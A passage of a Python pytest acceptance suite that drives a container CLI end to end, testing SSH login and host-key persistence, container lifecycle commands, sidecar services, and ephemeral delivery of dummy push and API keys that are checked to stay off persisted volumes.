"""Acceptance layer — constitution Principle V (Durable Spec, Disposable Code).

Real-container, end-to-end validation of the rootless SSH-identity behavior:
the load-bearing top of the inverted pyramid. These assert *observable behavior*
(a real client logging in over ssh, a fingerprint surviving a recreate) rather
than the code's internals, so they survive a regenerated implementation.

Marked `acceptance` and EXCLUDED by default (`addopts = -m 'not acceptance'` in
pyproject.toml); run with `pytest -m acceptance bin/tests`. The module skips
entirely without a container runtime + ssh tooling. Unlike scripts/smoke-test.sh
(the git-push acceptance, which needs a real repo), these paths never push, so
they need only DUMMY credentials and run in CI without any secrets.

Codifies the manual verification performed during the SSH-identity work.
"""

from __future__ import annotations

import base64
import json
import os
import shutil
import socket
import subprocess
import tempfile
import time
import types
from pathlib import Path

import pytest
from conftest import SCRIPT_PATH


def _acc_base() -> Path:
    """A working-dir base that the container runtime can bind-mount from on both
    Linux (any path) AND macOS+Lima (where /tmp and /private/var are NOT shared
    into the VM, but the user's home is). The `--host-key` file and the
    concatenated authorized_keys state file are bind-mounted, so they must live
    somewhere the daemon can read. Override with AGENT_CONTAINER_ACCEPTANCE_TMPDIR."""
    base = Path(
        os.environ.get("AGENT_CONTAINER_ACCEPTANCE_TMPDIR")
        or Path.home() / ".cache" / "agent-container-acceptance"
    )
    base.mkdir(parents=True, exist_ok=True)
    return base


def _detect_runtime() -> str | None:
    override = os.environ.get("AGENT_CONTAINER_RUNTIME")
    if override in ("docker", "podman") and shutil.which(override):
        return override
    for rt in ("docker", "podman"):
        if shutil.which(rt):
            return rt
    return None


RUNTIME = _detect_runtime()
_MISSING = [t for t in ("ssh", "ssh-keygen", "uv") if shutil.which(t) is None]

pytestmark = [
    pytest.mark.acceptance,
    pytest.mark.skipif(RUNTIME is None, reason="no docker/podman runtime on PATH"),
    pytest.mark.skipif(bool(_MISSING), reason=f"missing tools: {_MISSING}"),
]

# Invoke the real CLI exactly as an operator would (single PEP 723 uv script).
AGENT_CONTAINER = ["uv", "run", "--no-project", "--script", str(SCRIPT_PATH)]


# --- low-level helpers -------------------------------------------------------


def _cli_env(state_dir: Path) -> dict[str, str]:
    env = dict(os.environ)
    env["AGENT_CONTAINER_RUNTIME"] = RUNTIME  # deterministic runtime in CI
    env["XDG_STATE_HOME"] = str(state_dir)  # isolate the .port state files
    # Isolate CONFIG_DIR too so the suite never reads the developer's real
    # ~/.config/agent-container (hosts.json) AND so a test can seed a
    # convention-discovered canonical config under it (US3).
    env["XDG_CONFIG_HOME"] = str(state_dir / "xdgconfig")
    return env


def _config_dir_of(state_dir: Path) -> Path:
    """CONFIG_DIR the CLI resolves under the isolated XDG_CONFIG_HOME (see _cli_env)."""
    return state_dir / "xdgconfig" / "agent-container"


def _pcd(work: Path) -> Path:
    """Feature 011: the project config directory, created on demand."""
    d = work / ".agent-container"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _userconf(acc) -> Path:
    """Feature 011 FR-001f: plaintext credentials are USER-LEVEL only — there is
    deliberately no project-local location for them."""
    d = _config_dir_of(acc.state_dir)
    d.mkdir(parents=True, exist_ok=True)
    return d


def _exec(name: str, argv: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(
        [RUNTIME, "exec", f"agent-container-{name}", *argv],
        capture_output=True,
        text=True,
    )


def _run_cli(
    argv: list[str],
    state_dir: Path,
    timeout: int = 600,
    cwd: Path | None = None,
    extra_env: dict[str, str] | None = None,
):
    env = _cli_env(state_dir)
    if extra_env:
        env.update(extra_env)
    return subprocess.run(
        argv,
        env=env,
        cwd=str(cwd) if cwd else None,
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=timeout,
    )


def _gen_keypair(path: Path) -> Path:
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-f", str(path), "-N", ""],
        check=True,
        stdin=subprocess.DEVNULL,
    )
    return path


def _fingerprint(pub: Path) -> str:
    r = subprocess.run(["ssh-keygen", "-lf", str(pub)], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    return r.stdout.split()[1]  # SHA256:...


def _container_hostkey_fp(name: str) -> str:
    """Fingerprint of the host key the running container is actually using."""
    r = subprocess.run(
        [
            RUNTIME,
            "exec",
            f"agent-container-{name}",
            "ssh-keygen",
            "-lf",
            "/home/dev/.ssh/hostkeys/ssh_host_ed25519_key.pub",
        ],
        capture_output=True,
        text=True,
    )
    assert r.returncode == 0, r.stderr
    return r.stdout.split()[1]


def _container_diag(name: str) -> str:
    """Container status + recent logs — surfaced when sshd fails to come up so a
    CI failure shows WHY (crash, missing host key, sshd exit) instead of a bare
    'not reachable'. Reproducing this locally is hard (the failures are specific
    to the CI runtime), so the diagnostics must travel with the assertion."""
    cname = f"agent-container-{name}"
    chunks = []
    for label, argv in (
        (
            "ps",
            [
                RUNTIME,
                "ps",
                "-a",
                "--filter",
                f"name={cname}",
                "--format",
                "{{.Status}} | {{.Ports}}",
            ],
        ),
        ("logs (tail 80)", [RUNTIME, "logs", "--tail", "80", cname]),
    ):
        r = subprocess.run(argv, capture_output=True, text=True)
        chunks.append(f"--- {label} ---\n{(r.stdout + r.stderr).strip()}")
    return "\n".join(chunks)


def _wait_sshd(port: int, timeout: int = 45) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                time.sleep(1)  # sshd bound; give it a beat to accept auth
                return
        time.sleep(1)
    raise AssertionError(f"sshd never became reachable on port {port}")


def _ssh(port: int, key: Path, command: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [
            "ssh",
            "-i",
            str(key),
            "-p",
            str(port),
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "BatchMode=yes",
            "-o",
            "ConnectTimeout=10",
            "dev@localhost",
            command,
        ],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=30,
    )


# --- fixtures ----------------------------------------------------------------


@pytest.fixture(scope="session")
def _image(tmp_path_factory) -> str:
    """Build the image once for the whole acceptance session."""
    state = tmp_path_factory.mktemp("acc-build-state")
    r = _run_cli([*AGENT_CONTAINER, "build"], state, timeout=1800)
    if r.returncode != 0:
        pytest.fail(f"image build failed:\n{r.stderr[-3000:]}")
    return "localhost/agent-container:latest"


@pytest.fixture
def acc(_image):
    """Container lifecycle harness: .up()/.down()/.keys() drive the real CLI
    against real containers, and every container started is torn down + purged
    at the end of the test (even on failure). Working files live under a
    runtime-mountable base (see _acc_base) so bind mounts work under Lima too."""
    work = Path(tempfile.mkdtemp(dir=_acc_base()))
    state_dir = work / "state"
    state_dir.mkdir()
    started: list[str] = []

    def up(
        name,
        *,
        authorized_key=None,
        host_key=None,
        env_extra=None,
        push_key=None,
        known_hosts=None,
        mode=None,
        agent=None,
        task=None,
        workspace=None,
        workspace_dir=None,
        repo=None,
        foreground=False,
        wait=True,
    ):  # noqa: E501
        """Drive the real `up`. Returns the published port when `wait` (interactive:
        wait for sshd); with wait=False returns the CompletedProcess (headless — no
        sshd to wait for). Feature 004 flags are forwarded verbatim."""
        env_file = work / f"{name}.env"
        lines = ["GH_TOKEN=x", "GIT_USER_NAME=Test", "GIT_USER_EMAIL=t@example.com"]
        lines += list(env_extra or [])
        env_file.write_text("\n".join(lines) + "\n")
        argv = [*AGENT_CONTAINER, "up", name, "--env-file", str(env_file)]
        if host_key is not None:
            argv += ["--host-key", str(host_key)]
        for ak in authorized_key or []:
            argv += ["--authorized-key", str(ak)]
        if push_key is not None:
            argv += ["--push-key", str(push_key)]
        if known_hosts is not None:
            argv += ["--known-hosts", str(known_hosts)]
        if mode is not None:
            argv += ["--mode", mode]
        if agent is not None:
            argv += ["--agent", agent]
        if task is not None:
            argv += ["--task", task]
        if workspace is not None:
            argv += ["--workspace", workspace]
        if workspace_dir is not None:
            argv += ["--workspace-dir", str(workspace_dir)]
        if repo is not None:
            argv += ["--repo", repo]
        if foreground:
            argv += ["--foreground"]
        started.append(name)  # register for teardown even if `up` returns non-zero
        r = _run_cli(argv, state_dir)
        if not wait:
            return r
        assert r.returncode == 0, f"up {name} failed:\n{r.stderr}"
        # Feature 001: state is namespaced per host; `up` with no --host uses the
        # implicit 'local' host, so the port state lands under local/.
        port = int((state_dir / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None
        return port

    def down(name, *, purge=False):
        argv = [*AGENT_CONTAINER, "down", name, *(["--purge"] if purge else []), "-y"]
        r = _run_cli(argv, state_dir)
        assert r.returncode == 0, f"down {name} failed:\n{r.stderr}"

    def keys(name, *, authorized_key=None, host_key=None):
        argv = [*AGENT_CONTAINER, "keys", name]
        if host_key is not None:
            argv += ["--host-key", str(host_key)]
        for ak in authorized_key or []:
            argv += ["--authorized-key", str(ak)]
        r = _run_cli(argv, state_dir)
        assert r.returncode == 0, f"keys {name} failed:\n{r.stderr}"

    def volumes_of(name) -> list[str]:
        out = subprocess.run(
            [RUNTIME, "volume", "ls", "--format", "{{.Name}}"],
            capture_output=True,
            text=True,
        ).stdout.splitlines()
        return [v for v in out if v.startswith(f"agent-container-{name}-")]

    def cli(argv, *, cwd=None, extra_env=None, timeout=600):
        """Drive an arbitrary CLI subcommand against the fixture's isolated state
        (used by the declarative apply/status/destroy acceptance)."""
        return _run_cli(
            [*AGENT_CONTAINER, *argv], state_dir, timeout=timeout, cwd=cwd, extra_env=extra_env
        )

    yield types.SimpleNamespace(
        up=up,
        down=down,
        keys=keys,
        volumes_of=volumes_of,
        cli=cli,
        register=started.append,  # ensure a declaratively-applied container is torn down
        tmp=work,
        state_dir=state_dir,
    )

    for name in dict.fromkeys(started):  # dedupe, preserve order
        _run_cli([*AGENT_CONTAINER, "down", name, "--purge", "-y"], state_dir)
    shutil.rmtree(work, ignore_errors=True)


# --- acceptance tests --------------------------------------------------------


def test_rootless_pubkey_login_as_dev(acc):
    """An operator can ssh in with an injected pubkey, landing as the non-root
    dev user — the whole point of the rootless SSH design."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acclogin", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "whoami; id -u")
    assert r.returncode == 0, r.stderr
    assert r.stdout.split() == ["dev", "1000"]


def test_identity_persists_across_recreate(acc):
    """Host key AND authorized_keys survive down/up: the fingerprint is stable
    (no known_hosts churn) and login still works with no re-injection."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    hostkey = _gen_keypair(acc.tmp / "hostkey")
    injected_fp = _fingerprint(hostkey.with_suffix(".pub"))

    port = acc.up("accpersist", host_key=hostkey, authorized_key=[laptop.with_suffix(".pub")])
    assert _container_hostkey_fp("accpersist") == injected_fp
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"

    acc.down("accpersist")  # keep volumes
    port2 = acc.up("accpersist")  # recreate, no injection this time
    assert _container_hostkey_fp("accpersist") == injected_fp  # stable
    assert _ssh(port2, laptop, "whoami").stdout.strip() == "dev"  # authkeys kept


def test_live_key_injection_without_recreate(acc):
    """`keys` injects into a RUNNING container and reloads sshd: the host key
    changes to the supplied one and a new pubkey works, with no recreate."""
    port = acc.up("acclive")
    before = _container_hostkey_fp("acclive")

    hostkey = _gen_keypair(acc.tmp / "hostkey")
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.keys("acclive", host_key=hostkey, authorized_key=[laptop.with_suffix(".pub")])

    after = _container_hostkey_fp("acclive")
    assert after == _fingerprint(hostkey.with_suffix(".pub"))
    assert after != before
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"


def test_env_file_injection(acc):
    """Identity supplied through the env-file channel (SSH_AUTHORIZED_KEYS +
    SSH_HOST_ED25519_KEY_B64) is installed at boot."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    hostkey = _gen_keypair(acc.tmp / "hostkey")
    b64 = base64.b64encode(hostkey.read_bytes()).decode()
    pub = laptop.with_suffix(".pub").read_text().strip()

    port = acc.up(
        "accenv",
        env_extra=[
            f"SSH_AUTHORIZED_KEYS={pub}",
            f"SSH_HOST_ED25519_KEY_B64={b64}",
        ],
    )
    assert _container_hostkey_fp("accenv") == _fingerprint(hostkey.with_suffix(".pub"))
    assert _ssh(port, laptop, "whoami").stdout.strip() == "dev"


def test_purge_removes_all_nine_volumes(acc):
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("accpurge", authorized_key=[laptop.with_suffix(".pub")])
    assert len(acc.volumes_of("accpurge")) == 9  # Feature 010: 7 -> 9
    acc.down("accpurge", purge=True)
    assert acc.volumes_of("accpurge") == []


def test_distinct_containers_get_distinct_identities(acc):
    """Per-container identity (constitution Principle IV): two auto-generated
    containers have different host keys."""
    acc.up("accdist1")
    acc.up("accdist2")
    assert _container_hostkey_fp("accdist1") != _container_hostkey_fp("accdist2")


def _state_of(name: str) -> str:
    """'running' / 'exited' / '' (absent) for agent-container-<name> on the local daemon."""
    cname = f"agent-container-{name}"
    return subprocess.run(
        [RUNTIME, "ps", "-a", "--filter", f"name=^{cname}$", "--format", "{{.State}}"],
        capture_output=True,
        text=True,
    ).stdout.strip()


def _wait_state(name: str, want: str, timeout: int = 25) -> None:
    """Poll until agent-container-<name> reaches `want` — docker states are
    eventually-consistent (a just-recreated container flaps through 'restarting'
    before settling to 'running'), so assert on the settled state, not an instant."""
    deadline = time.time() + timeout
    last = _state_of(name)
    while time.time() < deadline:
        if last == want:
            return
        time.sleep(0.5)
        last = _state_of(name)
    raise AssertionError(f"{name}: state {last!r} != {want!r} after {timeout}s")


def test_lifecycle_stop_start_dispose_redeploy_wipe(acc):
    """US2 end-to-end (FR-006/007/008/009/017, SC-003): the three persistence
    levels + concurrency, against REAL containers."""
    import fcntl

    state = acc.tmp / "state"

    def cli(*args, timeout=600):
        return _run_cli([*AGENT_CONTAINER, *args], state, timeout=timeout)

    port = acc.up("acclc")
    fp1 = _container_hostkey_fp("acclc")  # host key persisted on the ~/.ssh volume

    # pause / reclaim (FR-006): stop retains, start resumes without recreation
    assert cli("stop", "acclc").returncode == 0
    _wait_state("acclc", "exited")
    assert cli("start", "acclc").returncode == 0
    _wait_sshd(port)
    _wait_state("acclc", "running")

    # SC-003 / FR-007: dispose then recreate restores prior config from volumes
    acc.down("acclc")  # dispose — container gone, volumes kept
    _wait_state("acclc", "")
    acc.up("acclc")
    assert _container_hostkey_fp("acclc") == fp1  # same host key => volume restored

    # redeploy (FR-008): rebuild + recreate, volumes preserved. Pass the same
    # env file the acc harness used for `up` (redeploy re-resolves inputs).
    assert cli("redeploy", "acclc", "--env-file", str(acc.tmp / "acclc.env")).returncode == 0
    _wait_sshd(port)
    _wait_state("acclc", "running")
    assert _container_hostkey_fp("acclc") == fp1  # volumes intact through the recreate

    # FR-017: a concurrent lifecycle op while the lock is held is refused
    lock = state / "agent-container" / "local" / "acclc.lock"
    lock.parent.mkdir(parents=True, exist_ok=True)
    with lock.open("w") as lf:
        fcntl.flock(lf.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        r = cli("stop", "acclc", timeout=60)
        assert r.returncode != 0 and "another lifecycle operation" in r.stderr, r.stderr

    # wipe (FR-009): container + volumes + built image gone (confirmed via -y)
    assert acc.volumes_of("acclc")  # had its seven volumes
    assert cli("wipe", "acclc", "-y").returncode == 0
    _wait_state("acclc", "")  # container gone
    assert acc.volumes_of("acclc") == []  # volumes wiped


def test_list_reconcile_unreachable_host_renders_without_hanging(acc, tmp_path):
    """US3 / SC-004 at the real CLI: `list` reconciles live — a registered host
    with a dead context renders 'unreachable' (never 'Up', never dropped) and does
    NOT hang the listing; `--local` skips the probe entirely."""
    acc.up("acclist")  # a real running container on the local host
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    driver = "podman" if "podman" in RUNTIME else "docker"
    reg = {
        "version": 1,
        "default": None,
        "hosts": {
            "dead": {
                "driver": driver,
                "context": "agent-container-nonexistent-xyz",  # no such context -> ps fails fast
                "address": "203.0.113.201",  # non-local -> reconciled
                "provisioning": None,
                "created_by_tool": False,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))

    def run_list(*extra):
        env = _cli_env(acc.tmp / "state")
        env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
        env.pop("HCLOUD_TOKEN", None)
        return subprocess.run(
            [*AGENT_CONTAINER, "list", "--json", *extra],
            env=env,
            capture_output=True,
            text=True,
            timeout=45,
        )

    t0 = time.time()
    r = run_list()
    assert r.returncode == 0, r.stderr
    assert time.time() - t0 < 30, "list hung on the unreachable host"
    # Feature 009: --json payloads are wrapped in a versioned envelope.
    rows = json.loads(r.stdout)["data"]["containers"]
    dead = [x for x in rows if x["host"] == "dead"]
    assert dead and all(x["status"] == "unreachable" for x in dead)  # never 'Up', never dropped
    assert any(x["name"] == "agent-container-acclist" for x in rows)  # local still listed

    rows_local = json.loads(run_list("--local").stdout)["data"]["containers"]
    assert not any(x["status"] == "unreachable" for x in rows_local)  # --local never probes


def _project_containers(name: str) -> list[str]:
    """Every container in the compose project for <name> (agent + any sidecars),
    matched by the deterministic name prefix so the assertion is independent of
    the runtime's compose label scheme (docker vs podman)."""
    prefix = f"agent-container-{name}"
    out = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"],
        capture_output=True,
        text=True,
    ).stdout.split()
    return sorted(c for c in out if c == prefix or c.startswith((prefix + "-", prefix + "_")))


def _container_state(cname: str) -> str:
    return subprocess.run(
        [RUNTIME, "ps", "-a", "--filter", f"name=^{cname}$", "--format", "{{.State}}"],
        capture_output=True,
        text=True,
    ).stdout.strip()


def _wait_container_state(cname: str, want: str, timeout: int = 25) -> None:
    deadline = time.time() + timeout
    last = _container_state(cname)
    while time.time() < deadline:
        if last == want:
            return
        time.sleep(0.5)
        last = _container_state(cname)
    raise AssertionError(f"{cname}: state {last!r} != {want!r} after {timeout}s")


# A sidecar override that reuses the already-built local image (no registry pull)
# and overrides the entrypoint to a plain long-running command (the agent image's
# real entrypoint requires env — the helper just needs to exist on the network).
_SIDECAR_YAML = (
    "services:\n"
    "  cache:\n"
    "    image: localhost/agent-container:latest\n"
    "    pull_policy: never\n"
    '    entrypoint: ["sleep", "infinity"]\n'
    '    restart: "no"\n'
)


def test_sidecar_shares_deployment_lifecycle(acc, _image):
    """US4 (FR-004) against REAL containers: a helper declared in the sidecar
    override joins the deployment's compose project and shares its lifecycle —
    up/stop/start/wipe act on the agent + helper as ONE unit (no orphaned helper),
    and the agent reaches the helper by its compose service name."""
    name = "accside"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    (_pcd(work) / f"{name}.services.yaml").write_text(_SIDECAR_YAML)

    def cli(*args, timeout=600):
        # cwd=work so the project-local override is discovered (mirrors real use).
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        conts = _project_containers(name)
        assert len(conts) == 2, f"expected agent + helper, got {conts}"
        assert f"agent-container-{name}" in conts
        helper = next(c for c in conts if c != f"agent-container-{name}")
        assert "cache" in helper

        # the agent resolves the helper by compose service name (shared network)
        g = subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", "getent", "hosts", "cache"],
            capture_output=True,
            text=True,
        )
        assert g.returncode == 0 and g.stdout.strip(), f"agent can't resolve 'cache': {g.stderr}"

        # stop/start move the whole unit — no orphaned helper
        assert cli("stop", name).returncode == 0, "stop failed"
        _wait_container_state(f"agent-container-{name}", "exited")
        _wait_container_state(helper, "exited")
        assert cli("start", name).returncode == 0, "start failed"
        _wait_container_state(f"agent-container-{name}", "running")
        _wait_container_state(helper, "running")

        # wipe removes the unit entirely — agent AND helper gone
        assert cli("wipe", name, "-y").returncode == 0, "wipe failed"
        _wait_container_state(f"agent-container-{name}", "")
        assert _project_containers(name) == [], "wipe left an orphaned helper"
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_push_credential_ephemeral_and_distinct(acc):
    """US1 (FR-012 / SC-004 / SC-008) against a REAL container: the injected
    outbound push key is wired for non-interactive push (IdentitiesOnly), lives
    ONLY in an ephemeral runtime dir (never on the persisted ~/.ssh volume), and
    is a DISTINCT credential from the inbound host key. (A full zero-prompt push
    to a real remote is the opt-in tokened extension, not run here.)"""
    push = _gen_keypair(acc.tmp / "agent_push")  # ed25519 private key
    kh = acc.tmp / "known_hosts"
    kh.write_text("github.com ssh-ed25519 AAAAKH\n")
    acc.up("accpush", push_key=push, known_hosts=kh)

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", "agent-container-accpush", *cmd], capture_output=True, text=True
        )

    # core.sshCommand wires the push key with IdentitiesOnly (no key-guessing prompt)
    ssh_cmd = _exec("git", "config", "--global", "--get", "core.sshCommand").stdout.strip()
    assert "IdentitiesOnly=yes" in ssh_cmd, ssh_cmd
    parts = ssh_cmd.split()
    keypath = parts[parts.index("-i") + 1]
    # the ephemeral key is 0600 and NOT under the persisted ~/.ssh volume (FR-012/SC-004)
    assert "/.ssh/" not in keypath, keypath
    assert _exec("stat", "-c", "%a", keypath).stdout.strip() == "600"
    assert _exec("test", "!", "-e", "/home/dev/.ssh/push_ed25519_key").returncode == 0
    # SC-008: distinct from the inbound host key
    push_fp = _exec("ssh-keygen", "-lf", keypath).stdout.split()[1]
    host_fp = _exec(
        "ssh-keygen", "-lf", "/home/dev/.ssh/hostkeys/ssh_host_ed25519_key"
    ).stdout.split()[1]
    assert push_fp != host_fp


def test_apikey_injection_ephemeral_and_off_volume(acc, _image):
    """US2 (FR-006/FR-012 / SC-003/SC-004, H1) against a REAL container: a
    convention-discovered provider key FILE is delivered EPHEMERALLY to the
    injected /run path and is NEVER copied onto the -claude/-codex/-pi volumes;
    Codex and pi have their home dirs redirected to an ephemeral location. (A real
    backend-reaching call, SC-002, is the opt-in tokened extension, not run here.)"""
    name = "accapi"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    # Project-local convention files (discovered relative to the CLI's cwd).
    ant_val = "sk-ant-ACCEPTANCE-SECRET"
    oai_val = "sk-oai-ACCEPTANCE-SECRET"
    (_userconf(acc) / f"{name}.anthropic.key").write_text(ant_val + "\n")
    (_userconf(acc) / f"{name}.openai.key").write_text(oai_val + "\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local key files are discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # The injected keys are delivered to the EPHEMERAL /run path (a compose config).
        assert _exec("test", "-f", "/run/agent-container/apikeys/anthropic").returncode == 0
        assert _exec("test", "-f", "/run/agent-container/apikeys/openai").returncode == 0

        # H1/FR-012/SC-004: the key VALUES are NEVER written onto a per-agent volume.
        for vol in ("/home/dev/.claude", "/home/dev/.codex", "/home/dev/.pi"):
            g = _exec("grep", "-rF", ant_val, vol)
            assert g.returncode != 0, f"anthropic key leaked onto {vol}:\n{g.stdout}"
            g = _exec("grep", "-rF", oai_val, vol)
            assert g.returncode != 0, f"openai key leaked onto {vol}:\n{g.stdout}"

        # Claude apiKeyHelper wired: settings.json references a helper that cats the
        # EPHEMERAL injected path (the command, not the secret, lives on the volume).
        s = _exec("cat", "/home/dev/.claude/settings.json")
        assert s.returncode == 0 and "apiKeyHelper" in s.stdout, s.stdout

        # Codex + pi: their homes are redirected to an ephemeral dir (off the volume).
        assert (
            _exec("sh", "-c", "test -d /tmp/agent-container-apikeys.$(id -u)/codex-home").returncode
            == 0
        ), "CODEX_HOME not redirected to an ephemeral dir"
        assert (
            _exec("sh", "-c", "test -d /tmp/agent-container-apikeys.$(id -u)/pi-home").returncode
            == 0
        ), "PI_CODING_AGENT_DIR not redirected to an ephemeral dir"

        # SC-003: the key value is not literal in the generated compose file either.
        compose = (state / "agent-container" / "local" / f"{name}.compose.yaml").read_text()
        assert ant_val not in compose and oai_val not in compose
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_injected_key_preserves_canonical_codex_config(acc, _image):
    """US2+US3 interaction regression (FR-007/SC-005): when a provider key is
    injected, Codex's home is redirected to an ephemeral dir — but the operator's
    canonical config (delivered fresh to ~/.codex) MUST be seeded into that
    redirected home, or the canonical config would be silently inert. Proves the
    ephemeral home carries config.toml while auth stays off the -codex volume."""
    name = "acccodexcfg"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    (_userconf(acc) / f"{name}.openai.key").write_text("sk-oai-SECRET\n")
    cfg = _pcd(work) / f"{name}.config" / "codex"
    cfg.mkdir(parents=True)
    marker = "model = 'CANONICAL-MARKER'"
    (cfg / "config.toml").write_text(marker + "\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args], env=_cli_env(state), cwd=str(work),
            capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=timeout,
        )  # fmt: skip

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        _wait_sshd(int((state / "agent-container" / "local" / f"{name}.port").read_text().strip()))
        # canonical config delivered to the volume home (FR-007) ...
        vol = _exec("cat", "/home/dev/.codex/config.toml")
        assert vol.returncode == 0 and marker in vol.stdout, vol.stdout
        # ... AND seeded into the redirected ephemeral CODEX_HOME so codex actually reads it
        eph = _exec(
            "sh", "-c", 'cat "/tmp/agent-container-apikeys.$(id -u)/codex-home/config.toml"'
        )
        assert eph.returncode == 0 and marker in eph.stdout, (
            f"canonical config not seeded: {eph.stdout}{eph.stderr}"
        )
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_canonical_config_fresh_redeploy_runtime_state_persists(acc, _image):
    """US3 (FR-007/FR-008 / SC-005) against a REAL container: operator-canonical
    config is delivered FRESH each deploy — a local edit propagates on `redeploy` —
    while the agent's mutable runtime state under the same home SURVIVES the
    container recreation from the per-agent volume (neither clobbers the other)."""
    name = "acccfg"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    # Project-local convention dir (discovered relative to the CLI's cwd): a
    # canonical file (in the manifest) plus a name that is NOT a manifest path.
    cfg = _pcd(work) / f"{name}.config" / "claude"
    cfg.mkdir(parents=True)
    (cfg / "CLAUDE.md").write_text("VERSION-ONE\n")

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local canonical config dir is discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # FR-007: canonical config was delivered onto the ~/.claude volume.
        c = _exec(name, ["cat", "/home/dev/.claude/CLAUDE.md"])
        assert c.returncode == 0 and "VERSION-ONE" in c.stdout, c.stdout

        # The agent writes RUNTIME STATE under the same home (not a manifest path).
        w = _exec(
            name,
            ["sh", "-c", "printf 'RUNTIME-STATE\\n' > /home/dev/.claude/history.jsonl"],
        )
        assert w.returncode == 0, w.stderr

        # Operator edits the canonical file locally, then redeploys.
        (cfg / "CLAUDE.md").write_text("VERSION-TWO\n")
        r = cli("redeploy", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # FR-007/SC-005: the edit propagated (canonical delivered fresh each deploy).
        c = _exec(name, ["cat", "/home/dev/.claude/CLAUDE.md"])
        assert c.returncode == 0 and "VERSION-TWO" in c.stdout, c.stdout
        # FR-008/SC-005: the runtime state survived the recreate (from the volume).
        h = _exec(name, ["cat", "/home/dev/.claude/history.jsonl"])
        assert h.returncode == 0 and "RUNTIME-STATE" in h.stdout, h.stdout
    finally:
        cli("wipe", name, "-y", timeout=120)


def test_secret_rotation_new_value_in_effect_old_gone(acc, _image):
    """US4 (FR-015 / SC-006) against a REAL container: rotating a tool-injected
    secret is only a LOCAL edit + `redeploy` — the new value is in effect at the
    ephemeral inject path afterward, and NO baked or persisted copy of the OLD
    value survives on the host (not on a per-agent volume, not in the compose file,
    and the host-side staged copy is overwritten with the new value).

    Scope note (opt-in/tokened, NOT run here): confirming a narrowly-scoped
    per-repo deploy key grants ONLY the intended repository access (FR-004) needs a
    real remote git host and a scoped key — that is the opt-in tokened extension,
